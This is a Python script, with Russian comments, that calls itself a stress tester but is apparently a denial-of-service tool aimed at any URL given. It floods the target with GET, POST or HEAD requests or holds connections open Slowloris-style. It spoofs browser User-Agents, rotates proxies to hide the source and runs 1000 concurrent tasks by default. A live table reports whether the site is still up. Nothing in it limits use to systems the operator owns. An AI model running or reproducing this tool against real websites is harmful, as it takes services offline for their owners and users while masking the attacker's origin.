import aiohttp
import asyncio
import random
import logging
import time
import queue
import argparse
import ssl
import os
from faker import Faker
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse
from rich.console import Console
from rich.table import Table
from rich.live import Live
import signal

# Настройка логирования
logging.basicConfig(
    filename='stress_test.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# Инициализация Faker и консоли
fake = Faker()
console = Console()

# Счётчики для метрик
class Metrics:
    def __init__(self):
        self.sent_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.site_alive = True
        self.start_time = time.time()
        self.lock = asyncio.Lock()

    async def increment_sent(self):
        async with self.lock:
            self.sent_requests += 1

    async def increment_successful(self):
        async with self.lock:
            self.successful_requests += 1

    async def increment_failed(self):
        async with self.lock:
            self.failed_requests += 1

    async def update_site_status(self, status):
        async with self.lock:
            self.site_alive = status

    def get_success_rate(self):
        total = self.successful_requests + self.failed_requests
        return (self.successful_requests / total * 100) if total > 0 else 0

    def get_elapsed_time(self):
        return int(time.time() - self.start_time)

metrics = Metrics()

# Список User-Agent
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1"
]

# Очередь для прокси
proxy_queue = queue.Queue()

# Проверка прокси
async def check_proxy(proxy, session):
    try:
        async with session.get("http://httpbin.org/ip", proxy=proxy, timeout=5) as response:
            if response.status == 200:
                return proxy
    except Exception:
        return None

# Загрузка и проверка прокси
def load_proxies(proxy_file):
    try:
        with open(proxy_file, 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
        loop = asyncio.get_event_loop()
        with ThreadPoolExecutor(max_workers=50) as executor:
            async def check_all_proxies():
                async with aiohttp.ClientSession() as session:
                    tasks = [check_proxy(proxy, session) for proxy in proxies]
                    return await asyncio.gather(*tasks, return_exceptions=True)
            valid_proxies = [p for p in loop.run_until_complete(check_all_proxies()) if p]
        for proxy in valid_proxies:
            proxy_queue.put(proxy)
        logging.info(f"Загружено {len(valid_proxies)} рабочих прокси.")
        return valid_proxies
    except FileNotFoundError:
        logging.error("Файл с прокси не найден.")
        return []

# Проверка статуса сайта
async def check_site_status(url, session):
    try:
        async with session.get(url, timeout=5) as response:
            status = 200 <= response.status < 300
            await metrics.update_site_status(status)
            logging.info(f"Статус сайта: {'Жив' if status else 'Недоступен'}")
    except Exception:
        await metrics.update_site_status(False)
        logging.error("Сайт недоступен при проверке статуса.")

# HTTP Flood
async def http_flood(url, method, session, proxy=None):
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache"
    }
    await metrics.increment_sent()
    try:
        if method.upper() == "GET":
            async with session.get(url, headers=headers, proxy=proxy, timeout=5) as response:
                status = response.status
        elif method.upper() == "POST":
            data = {"data": fake.text(max_nb_chars=500)}
            async with session.post(url, headers=headers, data=data, proxy=proxy, timeout=5) as response:
                status = response.status
        elif method.upper() == "HEAD":
            async with session.head(url, headers=headers, proxy=proxy, timeout=5) as response:
                status = response.status
        else:
            logging.error(f"Неподдерживаемый метод: {method}")
            return
        if 200 <= status < 300:
            await metrics.increment_successful()
        else:
            await metrics.increment_failed()
        logging.info(f"Запрос {method} отправлен: {status}")
    except Exception as e:
        await metrics.increment_failed()
        logging.error(f"Ошибка при запросе {method}: {e}")

# Slowloris-подобная атака
async def slowloris(url, session, proxy=None):
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Connection": "keep-alive",
        "Accept": "text/html"
    }
    await metrics.increment_sent()
    try:
        async with session.get(url, headers=headers, proxy=proxy, allow_redirects=False) as response:
            if 200 <= response.status < 300:
                await metrics.increment_successful()
            else:
                await metrics.increment_failed()
            await asyncio.sleep(random.uniform(5, 10))  # Держим соединение
        logging.info("Slowloris запрос отправлен")
    except Exception as e:
        await metrics.increment_failed()
        logging.error(f"Ошибка в Slowloris: {e}")

# Функция для отображения интерфейса
def generate_table():
    table = Table(title="Стресс-тест: Метрики by Shokov", style="blue")
    table.add_column("Метрика", style="cyan")
    table.add_column("Значение", style="magenta")
    table.add_row("Время выполнения (с)", str(metrics.get_elapsed_time()))
    table.add_row("Отправлено запросов", str(metrics.sent_requests))
    table.add_row("Успешных запросов", str(metrics.successful_requests))
    table.add_row("Неуспешных запросов", str(metrics.failed_requests))
    table.add_row("Процент успешных (%)", f"{metrics.get_success_rate():.2f}")
    table.add_row("Статус сайта", "Жив" if metrics.site_alive else "Недоступен")
    return table

# Основная функция атаки
async def attack(url, method, proxy_list=None, duration=60, tasks=1000):
    console.print(f"Запуск атаки на {url} с методом {method} на {duration} секунд с {tasks} задачами...")
    logging.info(f"Запуск атаки на {url} с методом {method}, {tasks} задач, {duration} секунд")
    end_time = time.time() + duration

    async def worker():
        async with aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(ssl=False, limit=0)
        ) as session:
            while time.time() < end_time:
                proxy = None
                if proxy_list and not proxy_queue.empty():
                    proxy = proxy_queue.get()
                    proxy_queue.put(proxy)  # Возвращаем прокси
                if method.upper() == "SLOWLORIS":
                    await slowloris(url, session, proxy)
                else:
                    await http_flood(url, method, session, proxy)
                await asyncio.sleep(random.uniform(0.01, 0.1))

    async def status_checker():
        async with aiohttp.ClientSession() as session:
            while time.time() < end_time:
                await check_site_status(url, session)
                await asyncio.sleep(1)  # Проверка каждую секунду

    async def table_updater(live):
        while time.time() < end_time:
            live.update(generate_table())
            await asyncio.sleep(1)  # Обновление таблицы каждую секунду

    # Запуск интерфейса и задач
    with Live(generate_table(), refresh_per_second=1, console=console) as live:
        tasks_list = [worker() for _ in range(tasks)]
        tasks_list.append(status_checker())
        tasks_list.append(table_updater(live))
        await asyncio.gather(*tasks_list, return_exceptions=True)
        live.update(generate_table())  # Финальное обновление таблицы

    console.print("Атака завершена.")
    logging.info(f"Итог: Время: {metrics.get_elapsed_time()} с, Отправлено: {metrics.sent_requests}, Успешно: {metrics.successful_requests}, Неуспешно: {metrics.failed_requests}, Процент успешных: {metrics.get_success_rate():.2f}%, Сайт жив: {metrics.site_alive}")

# Основная функция
def main():
    parser = argparse.ArgumentParser(description="Мощный стресс-тестер для проверки устойчивости сайтов.")
    parser.add_argument("--url", required=True, help="URL ресурса для тестирования")
    parser.add_argument("--method", default="GET", choices=["GET", "POST", "HEAD", "SLOWLORIS"],
                        help="Метод атаки (GET, POST, HEAD, SLOWLORIS)")
    parser.add_argument("--proxy-file", help="Путь к файлу с прокси[](http://ip:port)")
    parser.add_argument("--duration", type=int, default=60, help="Длительность атаки (секунды)")
    parser.add_argument("--tasks", type=int, default=1000, help="Количество асинхронных задач")

    args = parser.parse_args()

    # Проверка URL
    if not args.url.startswith("http"):
        args.url = "http://" + args.url
    try:
        import requests
        response = requests.get(args.url, timeout=5)
        logging.info(f"URL доступен: {response.status_code}")
    except Exception:
        console.print("Недействительный URL или ресурс недоступен.")
        logging.error("Недействительный URL или ресурс недоступен.")
        return

    # Загрузка прокси
    proxy_list = None
    if args.proxy_file:
        proxy_list = load_proxies(args.proxy_file)
        if not proxy_list:
            console.print("Нет рабочих прокси. Продолжаем без прокси.")
            proxy_list = None

    # Обработка SIGINT (Ctrl+C)
    def signal_handler(sig, frame):
        console.print("\nАтака остановлена пользователем.")
        logging.info(f"Атака остановлена: Время: {metrics.get_elapsed_time()} с, Отправлено: {metrics.sent_requests}, Успешно: {metrics.successful_requests}, Неуспешно: {metrics.failed_requests}, Процент успешных: {metrics.get_success_rate():.2f}%, Сайт жив: {metrics.site_alive}")
        asyncio.get_event_loop().stop()
        exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    # Запуск атаки
    loop = asyncio.get_event_loop()
    loop.run_until_complete(attack(args.url, args.method, proxy_list, args.duration, args.tasks))

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        console.print(f"Ошибка: {e}")
        logging.error(f"Критическая ошибка: {e}")